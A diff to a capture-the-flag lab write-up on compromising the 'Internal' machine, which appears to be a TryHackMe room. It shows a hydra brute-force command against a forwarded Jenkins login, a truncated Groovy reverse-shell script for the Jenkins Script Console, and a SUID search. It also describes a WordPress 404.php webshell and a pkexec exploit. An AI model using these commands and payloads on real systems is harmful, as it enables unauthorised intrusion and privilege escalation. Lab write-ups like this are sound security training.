@@ -99,7 +99,7 @@ $ wpscan --url http://internal.thm/wordpress --usernames admin --passwords /usr/
 
 <figure><img src="internal-3.png" alt=""><figcaption></figcaption></figure>
 
-Once I can log in wordpress, I can use a webshell to gain access to the machine. I edited the 404.php file so what then this page is accessed, I will get the shell.
+Since I can log in wordpress, I can use a webshell to gain access to the machine. I edited the 404.php file so what then this page is accessed, I will get the shell.
 
 <figure><img src="internal-4.png" alt=""><figcaption></figcaption></figure>
 
@@ -166,12 +166,39 @@ Looks interesting! Let's try to access via ssh with these credentials.
 
 <figure><img src="internal-7.png" alt=""><figcaption></figcaption></figure>
 
+I was able to log in! There is a file called `jenkins.txt`, and it looks like there is a Jenkins service running at 172.17.0.2:8080
 
+<figure><img src="internal-8.png" alt=""><figcaption></figcaption></figure>
+
+Let's take a look at this service. In order to communicate to the Jenkins service, I will use ssh to do local port forwarding. 
+
+<figure><img src="internal-9.png" alt=""><figcaption></figcaption></figure>
+
+This allows me to communicate to the Jenkins service via localhost port 4444 on my attacker machine.
+
+<figure><img src="internal-10.png" alt=""><figcaption></figcaption></figure>
+
+I tried several default credentials to log in, but they all failed. So, successfully log in, I'm going to use hydra to perform a brute-force attack.
+
+Before that, I need to know which form fields I need to pass to hydra.
+
+<figure><img src="internal-11.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="internal-12.png" alt=""><figcaption></figcaption></figure>
 
 ```
 $ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 4444 -V -f http-form-post '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password'
 ```
 
+I found these admin credentials
+
+<figure><img src="internal-13.png" alt=""><figcaption></figcaption></figure>
+
+I can now login to Jenkins as administrator.
+
+<figure><img src="internal-14.png" alt=""><figcaption></figcaption></figure>
+
+Since I can log in, I was able to escalate my privilege to root, running this script on "Script Console". 
 
 ```
 Thread.start {
@@ -182,8 +209,30 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 }
 ```
 
+<figure><img src="internal-15.png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="internal-16.png" alt=""><figcaption></figcaption></figure>
+
+I searched again for some files and I found a file called `note.txt` on `opt` folder. It contains the root credentials.
+
+<figure><img src="internal-17.png" alt=""><figcaption></figcaption></figure>
+
+I was able to authenticate as root! ;)
+
+<figure><img src="internal-18.png" alt=""><figcaption></figcaption></figure>
+
+Hmm, but there is another way to get root access on this machine...
+
+I was searching for some binaries with SUID set.
 
 ```
 www-data@internal:/home$ find / -perm /4000 2>/dev/null
 ```
+
+<figure><img src="internal-19.png" alt=""><figcaption></figcaption></figure>
+
+I looked for some exploits in pkexec. I sent the binary from my machine to the target and I executed it.
+
+<figure><img src="internal-20.png" alt=""><figcaption></figcaption></figure>
+
+R00ted! :)
